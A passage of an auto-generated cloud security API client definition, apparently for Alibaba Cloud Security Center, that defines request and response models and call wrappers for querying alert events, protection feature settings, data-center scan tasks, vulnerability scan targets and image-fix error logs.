*   **8**: marked as a false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired
*   **604**: marked as a false positive by the system', example='1'),
      eventSubType?: string(name='EventSubType', description='The subtype of the alert event.', example='login_common_location'),
      hasTraceInfo?: boolean(name='HasTraceInfo', description='Indicates whether the alert event has tracing information. Valid values:

*   **true**
*   **false**', example='true'),
      id?: long(name='Id', description='The unique ID of the alert event.', example='1000'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='70489fb520cea585ad9761d5a842****'),
      instanceId?: string(name='InstanceId', description='The instance ID of the affected asset.', example='i-9dp6dwsxdl9z5u1e2f****'),
      instanceName?: string(name='InstanceName', description='The name of the associated instance.', example='nginx'),
      internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='100.100.XX.XX'),
      k8sClusterId?: string(name='K8sClusterId', description='The ID of the Kubernetes cluster.', example='c517b37e1401e4961b3951863a49a****'),
      k8sClusterName?: string(name='K8sClusterName', description='The name of the Kubernetes cluster.', example='k8s-daily'),
      k8sNamespace?: string(name='K8sNamespace', description='The namespace of the Kubernetes cluster.', example='default'),
      k8sNodeId?: string(name='K8sNodeId', description='The ID of the Kubernetes node.', example='i-bp14a1ay8e0aa9t0****'),
      k8sNodeName?: string(name='K8sNodeName', description='The name of the Kubernetes node.', example='N/A'),
      k8sPodName?: string(name='K8sPodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
      largeModel?: boolean(name='LargeModel', description='Indicates whether the large model analysis tag is supported. Valid values:

*   **true**
*   **false**', example='true'),
      lastTime?: string(name='LastTime', description='The time when the alert event was last detected.', example='2018-09-26 01:51:01'),
      lastTimeStamp?: long(name='LastTimeStamp', description='The timestamp when the alert event was last detected. Unit: milliseconds.', example='1631699497000'),
      level?: string(name='Level', description='The severity of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousRuleStatus?: string(name='MaliciousRuleStatus', description='The status of the malicious behavior defense rule. Valid values:

*   **open**
*   **close**', example='open'),
      markList?: [ string ](name='MarkList', description='The tags of the alert events.'),
      markMisRules?: string(name='MarkMisRules', description='The advanced whitelist rule.', example='[{\\\\"uuid\\\\":\\\\"ALL\\\\",\\\\"field\\\\":\\\\"gmtModified\\\\",\\\\"operate\\\\":\\\\"contains\\\\",\\\\"fieldValue\\\\":\\\\"222\\\\"}]'),
      name?: string(name='Name', description='The complete name of the alert event.', example='Unusual Logon-Login with unusual location'),
      occurrenceTime?: string(name='OccurrenceTime', description='The time when the alert event was first detected.', example='2018-09-26 01:51:01'),
      occurrenceTimeStamp?: long(name='OccurrenceTimeStamp', description='The timestamp when the alert event was first detected. Unit: milliseconds.', example='1631699497000'),
      operateErrorCode?: string(name='OperateErrorCode', description='The handling result code of the alert event.', example='kill_and_quara.Success'),
      operateMsg?: string(name='OperateMsg', description='The handing result message of the alert event.', example='success'),
      operateTime?: long(name='OperateTime', description='The handling timestamp of the alert event. Unit: milliseconds.', example='1631699497000'),
      saleVersion?: string(name='SaleVersion', description='The edition of Security Center in which the alert event can be detected. Valid values:

*   **0**: Basic edition
*   **1**: Enterprise edition', example='1'),
      securityEventIds?: string(name='SecurityEventIds', description='The ID of the associated alert event.', example='270789'),
      sourceAliUid?: long(name='SourceAliUid', description='The ID of the Alibaba Cloud account within which an alert is generated.', example='196072141348****'),
      stages?: string(name='Stages', description='The stage at which the attack is detected.', example='"["authority_maintenance"]"'),
      tacticItems?: [ 
        {
          tacticDisplayName?: string(name='TacticDisplayName', description='The tactic name of ATT\\\\&CK.', example='Malicious scripts-Malicious script code execution'),
          tacticId?: string(name='TacticId', description='The stage information about ATT\\\\&CK.', example='TA0001'),
        }
      ](name='TacticItems', description='The display name of the attack stage.'),
      uniqueInfo?: string(name='UniqueInfo', description='The unique key of the alert.', example='e17e****'),
      uuid?: string(name='Uuid', description='The unique ID of the associated instance.', example='bf6b30d3-eea8-4924-9f0a-****'),
      clusterId?: string(name='clusterId', description='The ID of the cluster.', example='c2051775877374cccbf68af596e6****'),
    }
  ](name='SuspEvents', description='The information about the alert events.'),
  totalCount?: int32(name='TotalCount', description='The total number of alert events.', example='100'),
}

model DescribeSuspEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSuspEventsResponseBody(name='body'),
}

/**
 * @summary Queries a list of alert events that are generated without aggregation.
 *
 * @param tmpReq DescribeSuspEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSuspEventsResponse
 */
async function describeSuspEventsWithOptions(tmpReq: DescribeSuspEventsRequest, runtime: Util.RuntimeOptions): DescribeSuspEventsResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeSuspEventsShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.sourceAliUids)) {
    request.sourceAliUidsShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.sourceAliUids, 'SourceAliUids', 'simple');
  }
  var query = {};
  if (!Util.isUnset(request.alarmUniqueInfo)) {
    query['AlarmUniqueInfo'] = request.alarmUniqueInfo;
  }
  if (!Util.isUnset(request.assetsTypeList)) {
    query['AssetsTypeList'] = request.assetsTypeList;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.eventNames)) {
    query['EventNames'] = request.eventNames;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.multiAccountActionType)) {
    query['MultiAccountActionType'] = request.multiAccountActionType;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.operateErrorCodeList)) {
    query['OperateErrorCodeList'] = request.operateErrorCodeList;
  }
  if (!Util.isUnset(request.operateTimeEnd)) {
    query['OperateTimeEnd'] = request.operateTimeEnd;
  }
  if (!Util.isUnset(request.operateTimeStart)) {
    query['OperateTimeStart'] = request.operateTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.parentEventTypes)) {
    query['ParentEventTypes'] = request.parentEventTypes;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sortColumn)) {
    query['SortColumn'] = request.sortColumn;
  }
  if (!Util.isUnset(request.sortType)) {
    query['SortType'] = request.sortType;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.sourceAliUidsShrink)) {
    query['SourceAliUids'] = request.sourceAliUidsShrink;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.strictMode)) {
    query['StrictMode'] = request.strictMode;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.tacticId)) {
    body['TacticId'] = request.tacticId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of alert events that are generated without aggregation.
 *
 * @param request DescribeSuspEventsRequest
 * @return DescribeSuspEventsResponse
 */
async function describeSuspEvents(request: DescribeSuspEventsRequest): DescribeSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventsWithOptions(request, runtime);
}

model DescribeSuspiciousOverallConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='39.161.XX.XX'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **auto_breaking**: Anti-Virus
*   **ransomware_breaking**: Anti-ransomware (Bait Capture)
*   **webshell_cloud_breaking**: Webshell Protection
*   **alinet**: Behavior prevention
*   **k8s_log_analysis**: K8s Threat Detection
*   **alisecguard**: Defense mode for Client Protection

This parameter is required.', example='auto_breaking'),
}

model DescribeSuspiciousOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config', description='The status of the feature. Valid values:

*   **off**: disabled
*   **on**: enabled', example='on'),
    type?: string(name='Type', description='The type of the feature. Valid values:

*   **auto_breaking**: Anti-Virus
*   **ransomware_breaking**: Anti-ransomware (Bait Capture)
*   **webshell_cloud_breaking**: Webshell Protection
*   **alinet**: Behavior prevention
*   **k8s_log_analysis**: K8s Threat Detection
*   **alisecguard**: Defense mode for Client Protection', example='auto_breaking'),
  }(name='OverallConfig', description='The configuration.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model DescribeSuspiciousOverallConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSuspiciousOverallConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configuration of a specified feature.
 *
 * @param request DescribeSuspiciousOverallConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSuspiciousOverallConfigResponse
 */
async function describeSuspiciousOverallConfigWithOptions(request: DescribeSuspiciousOverallConfigRequest, runtime: Util.RuntimeOptions): DescribeSuspiciousOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspiciousOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configuration of a specified feature.
 *
 * @param request DescribeSuspiciousOverallConfigRequest
 * @return DescribeSuspiciousOverallConfigResponse
 */
async function describeSuspiciousOverallConfig(request: DescribeSuspiciousOverallConfigRequest): DescribeSuspiciousOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspiciousOverallConfigWithOptions(request, runtime);
}

model DescribeSuspiciousUUIDConfigRequest {
  type?: string(name='Type', description='The type of proactive defense. Valid values:

*   **auto_breaking**: virus defense
*   **ransomware_breaking**: ransomware capture
*   **webshell_cloud_breaking**: webshell defense
*   **alinet**: malicious behavior defense
*   **alisecguard**: client protection

This parameter is required.', example='alinet'),
}

model DescribeSuspiciousUUIDConfigResponseBody = {
  count?: int32(name='Count', description='The total number of servers on which proactive defense of the specified type takes effect.', example='2'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6044DC07-86F1-5DDA-A611-EC578EA4EEE6'),
  UUIDList?: [ string ](name='UUIDList', description='The UUIDs of servers on which proactive defense of the specified type takes effect.'),
}

model DescribeSuspiciousUUIDConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSuspiciousUUIDConfigResponseBody(name='body'),
}

/**
 * @summary Queries the UUIDs of servers on which proactive defense of a specified type takes effect.
 *
 * @param request DescribeSuspiciousUUIDConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSuspiciousUUIDConfigResponse
 */
async function describeSuspiciousUUIDConfigWithOptions(request: DescribeSuspiciousUUIDConfigRequest, runtime: Util.RuntimeOptions): DescribeSuspiciousUUIDConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspiciousUUIDConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the UUIDs of servers on which proactive defense of a specified type takes effect.
 *
 * @param request DescribeSuspiciousUUIDConfigRequest
 * @return DescribeSuspiciousUUIDConfigResponse
 */
async function describeSuspiciousUUIDConfig(request: DescribeSuspiciousUUIDConfigRequest): DescribeSuspiciousUUIDConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspiciousUUIDConfigWithOptions(request, runtime);
}

model DescribeSyncAssetTaskListRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: 1. Pages start from page 1.', example='1'),
  endTime?: long(name='EndTime', description='The timestamp when the IDC scan task ends. Unit: milliseconds.', example='1662430077000'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  startTime?: long(name='StartTime', description='The timestamp when the IDC scan task starts. Unit: milliseconds.', example='1652063828796'),
  taskName?: string(name='TaskName', description='The name of the IDC scan task.', example='IDC_PROBE_SCAN***'),
}

model DescribeSyncAssetTaskListResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of IDC scan tasks on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of IDC scan tasks per page. Default value: 20. If you leave this parameter empty, 20 IDC scan tasks are returned on each page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of IDC scan tasks returned.', example='110'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  taskRecords?: [ 
    {
      assetCount?: int32(name='AssetCount', description='The number of assets that are detected by the task.', example='100'),
      ipSegments?: string(name='IpSegments', description='The CIDR blocks that are used for scanning. Multiple CIDR blocks are separated by commas (,).', example='1.1.1.1/24,1.1.1.1/24'),
      processRate?: int32(name='ProcessRate', description='The progress of the task, in percentage.', example='100'),
      rootTaskId?: string(name='RootTaskId', description='The ID of the root task.', example='73c392f9c505129a257472a3f911d65d'),
      taskEndTime?: long(name='TaskEndTime', description='The timestamp when the task ended.', example='1653965680000'),
      taskName?: string(name='TaskName', description='The name of the task.', example='IDC_PROBE_SCAN-1.1.1..124-lse_ubuntu_test1'),
      taskStartTime?: long(name='TaskStartTime', description='The timestamp when the task started. Unit: milliseconds.', example='1633746651715'),
      taskStatus?: string(name='TaskStatus', description='The status of the IDC scan task. Valid Values:

*   **INIT**: The task is not started.
*   **START**: The task is started.
*   **MESSAGE_SEND**: The command is sent.
*   **SUCCESS**: The task is complete.
*   **FAIL**: The task failed.
*   **TIMEOUT**: The task timed out.', example='SUCCESS'),
      taskType?: string(name='TaskType', description='The type of the task. The value is fixed as **IDC_PROBE_SCAN**, which indicates an IDC scan task.', example='IDC_PROBE_SCAN'),
    }
  ](name='TaskRecords', description='The IDC scan tasks.'),
}

model DescribeSyncAssetTaskListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSyncAssetTaskListResponseBody(name='body'),
}

/**
 * @summary Queries a list of IDC scan tasks.
 *
 * @param request DescribeSyncAssetTaskListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSyncAssetTaskListResponse
 */
async function describeSyncAssetTaskListWithOptions(request: DescribeSyncAssetTaskListRequest, runtime: Util.RuntimeOptions): DescribeSyncAssetTaskListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSyncAssetTaskList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of IDC scan tasks.
 *
 * @param request DescribeSyncAssetTaskListRequest
 * @return DescribeSyncAssetTaskListResponse
 */
async function describeSyncAssetTaskList(request: DescribeSyncAssetTaskListRequest): DescribeSyncAssetTaskListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSyncAssetTaskListWithOptions(request, runtime);
}

model DescribeSyncAssetTaskLogDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: 1. Pages start from page 1.', example='1'),
  endTime?: long(name='EndTime', description='The end timestamp of the task.', example='1668064495000'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  rootTaskId?: string(name='RootTaskId', description='The ID of the IDC scan task. You can call the [DescribeSyncAssetTaskList](https://help.aliyun.com/document_detail/141932.html) operation to obtain the ID.', example='7e9565f537146fdf6bfb4e01f6f08818'),
  startTime?: long(name='StartTime', description='The start timestamp of the task.', example='1644027670'),
  taskName?: string(name='TaskName', description='The name of the IDC scan task.', example='IDC_PROBE_SCAN-TEST_001'),
}

model DescribeSyncAssetTaskLogDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='12'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  taskRecordDetails?: [ 
    {
      assetCount?: int32(name='AssetCount', description='The total number of assets.', example='5'),
      idcRegion?: string(name='IdcRegion', description='The region of the server in the data center.', example='cn-shanghai'),
      leafTaskId?: string(name='LeafTaskId', description='The ID of the task.', example='6c4e4c36ffc3e5919120b405c2b3****'),
      leafTaskStatus?: string(name='LeafTaskStatus', description='The status of the task. Valid values:

*   **INIT**: The task is not started.
*   **START**: The task is started.
*   **MESSAGE_SEND**: The command is sent.
*   **SUCCESS**: The task is complete.
*   **FAIL**: The task failed.
*   **TIMEOUT**: The task timed out.', example='INIT'),
      taskMsg?: string(name='TaskMsg', description='The description of the task.', example='unknown reason'),
      taskReportTime?: long(name='TaskReportTime', description='The timestamp when the task results were reported.', example='1671614217000'),
      unprotectedAssetCount?: int32(name='UnprotectedAssetCount', description='The number of unprotected assets.', example='0'),
    }
  ](name='TaskRecordDetails', description='The details of the tasks.'),
}

model DescribeSyncAssetTaskLogDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSyncAssetTaskLogDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of an IDC scan task.
 *
 * @param request DescribeSyncAssetTaskLogDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSyncAssetTaskLogDetailResponse
 */
async function describeSyncAssetTaskLogDetailWithOptions(request: DescribeSyncAssetTaskLogDetailRequest, runtime: Util.RuntimeOptions): DescribeSyncAssetTaskLogDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.rootTaskId)) {
    query['RootTaskId'] = request.rootTaskId;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSyncAssetTaskLogDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of an IDC scan task.
 *
 * @param request DescribeSyncAssetTaskLogDetailRequest
 * @return DescribeSyncAssetTaskLogDetailResponse
 */
async function describeSyncAssetTaskLogDetail(request: DescribeSyncAssetTaskLogDetailRequest): DescribeSyncAssetTaskLogDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSyncAssetTaskLogDetailWithOptions(request, runtime);
}

model DescribeTargetRequest {
  config?: string(name='Config', description='The type of the vulnerability. Valid values:

*   **cms**: Web CMS vulnerability
*   **sys**: Windows system vulnerability
*   **cve**: Linux software vulnerability
*   **emg**: urgent vulnerability', example='{"vulType":"cms"}'),
  type?: string(name='Type', description='The type of the query. Set the value to vul.', example='vul'),
}

model DescribeTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  targets?: [ 
    {
      flag?: string(name='Flag', description='The flag that is added to the server. This parameter can be empty.', example='del'),
      target?: string(name='Target', description='The UUID of the server or the ID of the server group.', example='5c5f0169-3527-40a2-b5ff-0bc1db8f****'),
      targetType?: string(name='TargetType', description='The type of the object. Valid values:

*   **uuid**: a server
*   **groupId**: a server group', example='uuid'),
    }
  ](name='Targets', description='The information about the server.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='10'),
}

model DescribeTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeTargetResponseBody(name='body'),
}

/**
 * @summary Queries the servers on which vulnerability scan is enabled.
 *
 * @param request DescribeTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeTargetResponse
 */
async function describeTargetWithOptions(request: DescribeTargetRequest, runtime: Util.RuntimeOptions): DescribeTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the servers on which vulnerability scan is enabled.
 *
 * @param request DescribeTargetRequest
 * @return DescribeTargetResponse
 */
async function describeTarget(request: DescribeTargetRequest): DescribeTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTargetWithOptions(request, runtime);
}

model DescribeTaskErrorLogRequest {
  buildTaskId?: string(name='BuildTaskId', description='The ID of the task.

>  You can call the DescribeImageFixTask operation to query the IDs of tasks.

This parameter is required.', example='ivf-6e520160-205d-4801-b8e9-9e7e****'),
}

model DescribeTaskErrorLogResponseBody = {
  logs?: [ 
    {
      text?: string(name='Text', description='The text content of the log.', example='mv: cannot move \\\\"CentOS-Base.repo\\\\" to \\\\"CentOS-Base.repo.backup\\\\": Permission denied'),
    }
  ](name='Logs', description='An array that consists of the error logs.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='F929E952-EBFC-56C3-BD35-BF8B59024C69'),
}

model DescribeTaskErrorLogResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeTaskErrorLogResponseBody(name='body'),
}

/**
 * @summary Queries the error logs on a task that failed to fix image vulnerabilities.
 *
 * @param request DescribeTaskErrorLogRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeTaskErrorLogResponse
 */
async function describeTaskErrorLogWithOptions(request: DescribeTaskErrorLogRequest, runtime: Util.RuntimeOptions): DescribeTaskErrorLogResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.buildTaskId)) {
    query['BuildTaskId'] = request.buildTaskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTaskErrorLog',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the error logs on a task that failed to fix image vulnerabilities.
 *
 * @param request DescribeTaskErrorLogRequest
 * @return DescribeTaskErrorLogResponse
 */
async function describeTaskErrorLog(request: DescribeTaskErrorLogRequest): DescribeTaskErrorLogResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTaskErrorLogWithOptions(request, runtime);
}

model DescribeTotalStatisticsRequest {
  from?: string(name='From', description='The source of data. Default value: **aqs**. Valid values:

*   **sas**: Security Center
*   **aqs**: Server Guard', example='sas'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](https://help.aliyun.com/document_detail/130972.html) operation to query the IDs of asset groups.', example='8076980'),
  remark?: string(name='Remark', description='The name or public IP address of the asset.', example='222.185.XX.XX'),
}

model DescribeTotalStatisticsResponseBody = {
  account?: int32(name='Account', description='The number of logons to the asset.', example='0'),
  health?: int32(name='Health', description='The total number of unfixed baseline risks.', example='0'),
  healthTotal?: int32(name='HealthTotal', description='The total number of baseline risks.', example='0'),
  healthdealedTotal?: int32(name='HealthdealedTotal', description='The total number of fixed baseline risk items. This parameter is deprecated.', example='0'),
  healthhighTotal?: int32(name='HealthhighTotal', description='The number of baseline risk items whose severity is high.', example='0'),
  healthlowTotal?: int32(name='HealthlowTotal', description='The number of baseline risk items whose severity is low.', example='0'),
  healthmediumTotal?: int32(name='HealthmediumTotal', description='The number of baseline risk items whose severity is medium.', example='0'),
  healthseriousTotal?: int32(name='HealthseriousTotal', description='The number of baseline risk items whose severity is urgent. This parameter is deprecated.', example='0'),
  newsuspicious?: int32(name='Newsuspicious', description='The number of alerts that are generated by Server Guard or Security Center.

> 

> *   If you set the **Type** parameter to **sas**, this parameter indicates the number of alerts that are generated by Security Center.

> *   If you set the **Type** parameter to **aqs**, this parameter indicates the number of alerts that are generated by Server Guard.', example='0'),
  online?: boolean(name='Online', description='Indicates whether the agent is online. Valid values:

*   **true**
*   **false**', example='true'),
  patch?: int32(name='Patch', description='The number of Web-CMS vulnerabilities.', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
  suspicious?: int32(name='Suspicious', description='The number of alerts that are generated by Server Guard.', example='0'),
  suspiciousTotal?: int32(name='SuspiciousTotal', description='This parameter is deprecated.', example='0'),
  suspiciousdealedTotal?: int32(name='SuspiciousdealedTotal', description='The number of handled alerts.', example='0'),
  suspicioushighTotal?: int32(name='SuspicioushighTotal', description='This parameter is deprecated. This parameter is deprecated.', example='0'),
  suspiciouslowTotal?: int32(name='SuspiciouslowTotal', description='The number of alerts whose risk level is reminder.', example='0'),
